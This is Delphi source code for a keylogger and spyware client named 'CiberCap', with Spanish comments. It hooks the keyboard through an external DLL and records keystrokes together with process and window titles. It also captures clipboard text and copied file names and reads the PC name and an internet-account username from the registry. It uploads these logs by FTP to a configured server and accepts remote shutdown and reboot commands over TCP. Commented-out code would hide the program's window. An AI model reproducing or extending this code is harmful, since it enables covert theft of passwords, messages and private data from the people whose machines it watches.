unit UCiberCap;
 
interface
 
uses 
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient,
  IdCustomTCPServer, IdTCPServer, IdContext, ExtCtrls, clTcpClient, clFtp,
  IdRawBase, IdRawClient, IdIcmpClient,U_USB, ComCtrls,
  ShlObj, cxShellCommon, cxGraphics, cxControls, cxLookAndFeels,
  cxLookAndFeelPainters, dxSkinsCore, dxSkinBlack, dxSkinBlue, dxSkinCaramel,
  dxSkinCoffee, dxSkinDarkRoom, dxSkinDarkSide, dxSkinFoggy, dxSkinGlassOceans,
  dxSkiniMaginary, dxSkinLilian, dxSkinLiquidSky, dxSkinLondonLiquidSky,
  dxSkinMcSkin, dxSkinMoneyTwins, dxSkinOffice2007Black, dxSkinOffice2007Blue,
  dxSkinOffice2007Green, dxSkinOffice2007Pink, dxSkinOffice2007Silver,
  dxSkinOffice2010Black, dxSkinOffice2010Blue, dxSkinOffice2010Silver,
  dxSkinPumpkin, dxSkinSeven, dxSkinSharp, dxSkinSilver, dxSkinSpringTime,
  dxSkinStardust, dxSkinSummer2008, dxSkinsDefaultPainters, dxSkinValentine,
  dxSkinXmas2008Blue, cxContainer, cxEdit, cxShellTreeView, dxSkinBlueprint,
  dxSkinDevExpressDarkStyle, dxSkinDevExpressStyle, dxSkinHighContrast,
  dxSkinSevenClassic, dxSkinSharpPlus, dxSkinTheAsphaltWorld, dxSkinVS2010,
  dxSkinWhiteprint, cxShellControls, ZylTimer,IdFTP,UnitThreads, cxTreeView;


type
 TRegistro = Record  //los datos que se guardarán en el fichero
    nombreProceso : String;
    nombreVentana : String;
    fechaHora : TDateTime;
  end;

  TUltimo = Record
    ProcessID : Cardinal;
    Control : Cardinal;
    Window : Cardinal;
  end;

  PKeybrdInfo = ^TKeybrdInfo;
  TKeybrdInfo = record
    VirtualKey : Integer;
    KeyStore   : Integer;
    CurrentProcessId: Cardinal;
    CurrentControl: Cardinal;
    WindowHwnd: Cardinal;
  end;

  TFCiberCap = class(TForm)
    MemoKeyLoger: TMemo;
    cliente: TIdTCPClient;
    servidor: TIdTCPServer;
    Image1: TImage;
    clFTP: TclFtp;
    cxShellTreeView1: TcxShellTreeView;
    MemoUSBInfo: TMemo;
    CrearFicheros: TZylTimer;
    Memo1: TMemo;
    procedure FormDestroy(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure servidorExecute(AContext: TIdContext);
    procedure CrearFicherosTimer(Sender: TObject);
  private
    { Private declarations }

  public
    { Public declarations }
    procedure OnWmCopyData(var Msg: TMessage); message WM_COPYDATA;
    function  GetModule(ProcessID : Cardinal) : ShortString;
    function  GetActiveCaption: string;
    function  GetPcName: string;
    function  GetIPLocal: String;
    function  GetUserName : String;
    function  GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
    function  GetUsuarioTarjeta: string;
    procedure Deviceinserted(sender:tobject);
    procedure Deviceremoved(sender:tobject);
    procedure DecodificarMensaje(mensaje: string);
    procedure ApagarPC;
    procedure ReiniciarPC;
    procedure WMChangeCBChain(var Message : TWMChangeCBChain); message WM_CHANGECBCHAIN;
    procedure WMDrawClipboard(var Message : TMessage); message WM_DRAWCLIPBOARD;
  var
    Server:string;
    VentanaAnterior:string;
    VentanaActiva:string;
    Comando:string;
    DestinoFicheros:string;

    FTP_Imagen    : TIdFTP;
    FTP_Teclas    : TIdFTP;
    FTP_USBTree   : TIdFTP;
    FTP_USB_INFO  : TIdFTP;

    MSTexto   : TMemoryStream;
    MSUsbInfo : TMemoryStream;

    ConnectedPPPOE:Boolean;
    USB1: TComponentUSB;
    MensajeRX,ParametroRX:string;
    NextViewer:THandle;

    TareaPantallas  :ThreadPantallas;
    TareaUSB :ThreadUSB;
    TareaAviso : ThreadAviso;
    TareaPPPOE : ThreadPPPOE;
  end;

  const
  nombreDLL = 'HT';

  var
   FCiberCap: TFCiberCap;

   registroPulsacion : TRegistro;
   keyloggerActivado : Boolean = False;
   ultimo : TUltimo;

  Function BeginMouseHook (HDest : THandle) : Boolean; stdcall; external nombreDLL;
  procedure EndMouseHook; stdcall; external nombreDLL;
  Function BeginKeybrdHook (HDest : THandle) : Boolean; stdcall; external nombreDLL;
  procedure EndKeybrdHook; stdcall; external nombreDLL;


implementation

 {$R *.DFM}
uses WinInet,Winsock,IniFiles,jpeg,clFtpUtils,ClipBrd,ShellAPI,Registry,TLHelp32 ;


// Cuando llege una tecla.
procedure TFCiberCap.OnWmCopyData(var Msg: TMessage);
var
  WText: array[0..255] of Char;
begin
  try
  if Msg.WParam = 1 then
  begin
    with PKeybrdInfo(PCopyDataStruct(Msg.LParam)^.lpData)^ do
    begin

      if  (CurrentProcessId <> ultimo.ProcessID) or
          (CurrentControl <> ultimo.Control) or
          (WindowHWND <> ultimo.Window) then
      begin
        // GUARDAR DATOS DE LA VENTANA Y OTROS
        MemoKeyLoger.Lines.Add('---------');
        registroPulsacion.nombreProceso := GetModule(CurrentProcessId);
        MemoKeyLoger.Lines.Add( 'Proceso: ' + registroPulsacion.nombreProceso);
        GetWindowText(WindowHWND, WText, SizeOf(WText));
        registroPulsacion.nombreVentana := String(WText);
        MemoKeyLoger.Lines.Add( 'Ventana: ' + registroPulsacion.nombreVentana);
        MemoKeyLoger.Lines.Add('Hora: ' + DateToStr(registroPulsacion.fechaHora) + ' '+ TimeToStr(registroPulsacion.fechaHora));
        MemoKeyLoger.Lines.Add('---------');
        MemoKeyLoger.Lines.Add(' ');
        registroPulsacion.fechaHora := Now;
      end;

      if (KeyStore and $80000000) = 0 then
        postMessage(MemoKeyLoger.Handle, WM_KEYDOWN, VirtualKey, KeyStore)
      else
        PostMessage(MemoKeyLoger.Handle, WM_KEYUP, VirtualKey, KeyStore);

        ultimo.ProcessID:= CurrentProcessId;
        ultimo.Control:= CurrentControl;
        ultimo.Window:=  WindowHWND;
    end;
  end;
  except
     FCiberCap.Memo1.Lines.Add('Error CK');
  end;
end;

// Creando los ficheros del memo  keylogger
procedure TFCiberCap.CrearFicherosTimer(Sender: TObject);
var
  Fecha:string;
  Hora:string;
  FicheroTexto:string;
begin
  try
     if ConnectedPPPOE = True then
     begin
       if (FTP_Teclas.Connected) then
       begin
          MSTexto:= TMemoryStream.Create;

          if MemoKeyLoger.Lines.Count > 0 then
          begin
            Fecha:=StringReplace(DateToStr(Now),'/','-',[rfReplaceAll]);
            Hora:=StringReplace(TimeToStr(Now),':','.',[rfReplaceAll]);
            FicheroTexto:=GetPcName+'&'+GetUsuarioTarjeta+'&'+Fecha+'&'+Hora+'&'+'T'+'.Temp';

            MemoKeyLoger.Lines.SaveToStream(MSTexto);

            if FCiberCap.FTP_Teclas.Connected then
            begin
             FTP_Teclas.Put(MSTexto, FicheroTexto, False,-1 );
             MSTexto.Free;
             MemoKeyLoger.Lines.Clear;
            end
            else
            begin
             MSTexto.Free;
            end;
          end;
       end;
     end;
  except
     FCiberCap.Memo1.Lines.Add('error K');
     MSTexto.Free;
  end;
end;

// Cuando se conecta un usb
procedure TFCiberCap.Deviceinserted(sender: tobject);
begin
   //
end;

// Cuando se desconecta un usb
procedure TFCiberCap.deviceremoved(sender: tobject);
begin
//  try
//    TareaUSB.Terminate;
//  except
//
//  end;
end;

// Guardando la captura del Clipboard
procedure TFCiberCap.WMDrawClipboard(var Message: TMessage);
var
  HPortapapeles: THandle;  // Handle del portapapeles
  iNumArc, i: Integer;     // Nº de archivos
  Archivo: array [0..MAX_PATH - 1] of char;
begin
  try
    if (FTP_Teclas.Connected) then
    begin
      // Format texto
      if Clipboard.HasFormat(CF_TEXT) then
      begin
        MemoKeyLoger.Lines.Add('');
        MemoKeyLoger.Lines.Add('--> Copió el siguiente texto al Clipboard');
        MemoKeyLoger.Text := MemoKeyLoger.Text + Clipboard.AsText ;
        MemoKeyLoger.Lines.Add('');
      end;

      // Bitmap
    //  if Clipboard.HasFormat(CF_BITMAP) then
    //  begin
    //    Image1.Picture.LoadFromClipboardFormat(CF_BITMAP,ClipBoard.GetAsHandle(CF_BITMAP),0);
    //  end;

      // leer nombre de los archivos copiados al portapapeles
      if ClipBoard.HasFormat( CF_HDROP ) then
      begin
        HPortapapeles := ClipBoard.GetAsHandle( CF_HDROP );
        iNumArc := DragQueryFile( HPortapapeles, $FFFFFFFF, nil, 0);

        for i := 0 to iNumArc - 1 do
        begin
          DragQueryFile( HPortapapeles, i, @Archivo, MAX_PATH );
          MemoKeyLoger.Lines.Add('');
          MemoKeyLoger.Lines.Add('--> Copió el siguiente archivo al Clipboard');
          MemoKeyLoger.Text:=MemoKeyLoger.Text + Archivo;
          MemoKeyLoger.Lines.Add('');
        end;
      end;

      //...  Podemos programar el resto de formatos   CF_.....
      // Existe otro visualizador encadenado ?
      if (NextViewer <> 0) then
      begin
        // Le envío el mensage que he recibido
        SendMessage(NextViewer,Message.Msg, Message.WParam,Message.LParam);
      end;
    end;
  except

  end;
end;

// Apagar la PC
procedure TFCiberCap.ApagarPC;
begin
  ExitWindowsEx(EWX_FORCE,0);
 // ExitWindowsEx(EWX_POWEROFF,0);
end;

// Reiniciar la PC
procedure TFCiberCap.ReiniciarPC;
begin
  ExitWindowsEx(EWX_REBOOT,0);
end;

//____________________________________________________________________

// Cuando llege un mensaje.
procedure TFCiberCap.servidorExecute(AContext: TIdContext);
var
  sMensaje: String;
begin
  try
    sMensaje:='';
    sMensaje := AContext.Connection.Socket.ReadLn;

    // decodificar el mensaje
    DecodificarMensaje(sMensaje);

    // Reiniciando la PC
    if MensajeRX = 'RPC' then
    begin
     ReiniciarPC;
    end;

    // Apagando la PC
    if MensajeRX = 'APC' then
    begin
     ApagarPC;
    end;
  except

  end;
end;

// Decodificando el mensaje del socket
procedure TFCiberCap.DecodificarMensaje(mensaje: string);
var
cad0,cad1:string;
pos1:Integer;
begin
 try
   cad0:=mensaje;
   //Tomando el mensaje;
   pos1:=Pos('&',cad0);
   MensajeRX:=copy(cad0,0,pos1-1);
   Delete(cad0,1,pos1);
   cad1:=cad0;
   //Tomando el parametro
   ParametroRX:=cad1;
 except

 end;
end;

// Activando el monitor del Clipboard
procedure TFCiberCap.WMChangeCBChain(var Message: TWMChangeCBChain);
begin
  try
      // Se ha eliminado el siguiente en la cadena a nosotros ?
    if (Message.Remove = NextViewer) then
    begin
      // Actualizamos nuestro apuntador al siguiente
      NextViewer := Message.Next;
    end
    else   // el eliminado no es el siguiente a nosotros ==> propagamos el mensaje
    begin
      if (NextViewer <> 0) then
      begin
        // Parametros:
        // +  A quien le enviamos el mensaje
        // +  el mensaje
        // +  los dos parámetros en el orden correcto
        SendMessage(NextViewer ,WM_CHANGECBCHAIN, TMessage(Message).WParam,TMessage(Message).LParam);
      end;
    end;
  except

  end;
end;

// Cuando se cierre el programa.
procedure TFCiberCap.FormDestroy(Sender: TObject);
begin
   // desactivando el keylogger
   EndKeybrdHook;
end;

// Al iniciar el programa, leer donde esta el server
procedure TFCiberCap.FormShow(Sender: TObject);
var
  INI : TIniFile;
  path,name:string;
begin
   registroPulsacion.nombreProceso := #0;
   registroPulsacion.nombreVentana := #0;
   ultimo.ProcessID := 0;
   ultimo.Control := 0;
   ultimo.Window := 0;

   //Esconder la aplicacion
   try
//     Width:=0;
//     Height:=0;
//     AlphaBlend:=true;
//     AlphaBlendValue:=0;
     VentanaAnterior:= GetActiveCaption;
//     ShowWindow(Application.Handle, SW_HIDE);
//     Left:=-1000;
   except

   end;

   //leer donde esta el server
   try
    path:=ExtractFilePath(Application.ExeName);
    name:=Copy(ExtractFileName(Application.ExeName),0,length(ExtractFileName(Application.ExeName))-3)+'ini';
    INI := TIniFile.Create(path+name) ;
    Server:=INI.ReadString('config','server','');
   except
     FCiberCap.Memo1.Lines.Add('error leer donde esta el server');
   end;

   //Activando el keylogger
   try
     BeginKeybrdHook (Handle)
   except

   end;

   // Conecciones FTP
   try
     FTP_Imagen:=TIdFTP.Create(nil);
     FTP_Teclas:=TIdFTP.Create(nil);
   except
    FCiberCap.Memo1.Lines.Add('leer creando las conecciones ftp');
   end;

   // Registrar el Clipbpard viewer
   try
     NextViewer := SetClipboardViewer(Handle);
     MemoKeyLoger.Clear;
   except

   end;

   // Iniciando las tareas
   try
     TareaAviso:=ThreadAviso.Create(true);
     TareaAviso.Resume;

     TareaPantallas:=ThreadPantallas.Create(true);
     TareaPantallas.Resume;

     TareaPPPOE:=ThreadPPPOE.Create(true);
     TareaPPPOE.Resume;
   except
     FCiberCap.Memo1.Lines.Add('error iniciando los Threads');
   end;
end;

//_____________________________________________________________________

// Saber la ventana que esta activa de windows
function  TFCiberCap.GetActiveCaption: string;
var
  Handle: THandle;
  Len: LongInt;
  Title: String;
begin
  try
     Result := '';
     Handle := GetForegroundWindow;
     if Handle <> 0 then
     begin
       Len := GetWindowTextLength(Handle) + 1;
       SetLength(Title, Len);
       GetWindowText(Handle, PChar(Title), Len);
       GetActiveCaption := TrimRight(Title);
     end;
  except

  end;
end;

// Saber el nombre del PC
function  TFCiberCap.GetPcName: string;
var size: DWORD;
begin
   try
     size := 128;
     setlength(result, size);
     if GetComputername(PChar(result), size) then
        setlength(result, size)
     else result := 'desconocido';
   except

   end;
end;

// Saber la IP Local
function  TFCiberCap.GetIPLocal: String;
var
  p: PHostEnt;
  s: array[0..128] of AnsiChar;
  p2: pansichar;
  wVersionRequested: WORD;
  wsaData: TWSAData;
begin
  try
    // Arranca la librería WinSock
    wVersionRequested := MAKEWORD( 1, 1 );
    WSAStartup( wVersionRequested, wsaData );

    // Obtiene el nombre del PC
    GetHostName( @s, 128 );
    p := GetHostByName( @s );

    // Obtiene la dirección IP y libera la librería WinSock
    p2 := iNet_ntoa( PInAddr( p^.h_addr_list^ )^ );
    Result := p2;
    WSACleanup;
  except

  end;
end;

// Saber el nombre de usuario
function TFCiberCap.GetUserName : String;
var
 pcUser   : PChar;
 dwUSize : DWORD;
begin
   dwUSize := 21;
   GetMem( pcUser, dwUSize );
   try
      if Windows.GetUserName( pcUser, dwUSize ) then
         Result := pcUser
   finally
      FreeMem( pcUser );
   end;
end;

// Saber el nombre de usuario   de la tarjeta
function TFCiberCap.GetUsuarioTarjeta: string;
begin
  try
     result:=(GetRegistryData(HKEY_LOCAL_MACHINE,
    '\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\nauta', 'UserName'));
   // Result:='Desconocido';
  except
     FCiberCap.Memo1.Lines.Add('obteniendo el usuario');
     Result:='Desconocido';
  end;
end;

function TFCiberCap.GetRegistryData(RootKey: HKEY; Key, Value: string): variant;
	var
	  Reg: TRegistry;
	  RegDataType: TRegDataType;
	  DataSize, Len: integer;
	  s: string;
    label cantread;
	begin
	  Reg := nil;
	  try
	    Reg := TRegistry.Create(KEY_QUERY_VALUE);
	    Reg.RootKey := RootKey;
	    if Reg.OpenKeyReadOnly(Key) then begin
	      try
	        RegDataType := Reg.GetDataType(Value);
	        if (RegDataType = rdString) or
	           (RegDataType = rdExpandString) then
	          Result := Reg.ReadString(Value)
	        else if RegDataType = rdInteger then
	          Result := Reg.ReadInteger(Value)
	        else if RegDataType = rdBinary then begin
	          DataSize := Reg.GetDataSize(Value);
	          if DataSize = -1 then goto cantread;
	          SetLength(s, DataSize);
	          Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
	          if Len <> DataSize then goto cantread;
	          Result := s;
	        end else
	        cantread:
	          raise Exception.Create(SysErrorMessage(ERROR_CANTREAD));
	      except
	        s := ''; // Deallocates memory if allocated
	        Reg.CloseKey;
	        raise;
	      end;
	      Reg.CloseKey;
	    end
      else
	      raise Exception.Create(SysErrorMessage(GetLastError));
	  except
	    Reg.Free;
	    raise;
	  end;
	  Reg.Free;
	end;

function TFCiberCap.GetModule(ProcessID : Cardinal) : ShortString;
var
  ProcessEntry : TProcessEntry32;
  Snap : Cardinal;
begin
  Snap := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  try
    ProcessEntry.dwSize := SizeOf(ProcessEntry);
    if (Process32First(Snap, ProcessEntry)) then
    begin
      repeat
        if ProcessEntry.th32ProcessID = ProcessID then
        begin
          Result := String(ProcessEntry.szExeFile);
          Break;
        end;
      until not (Process32Next(Snap, ProcessEntry));
    end;
  finally
    Windows.CloseHandle(Snap);
  end;
end;

end.

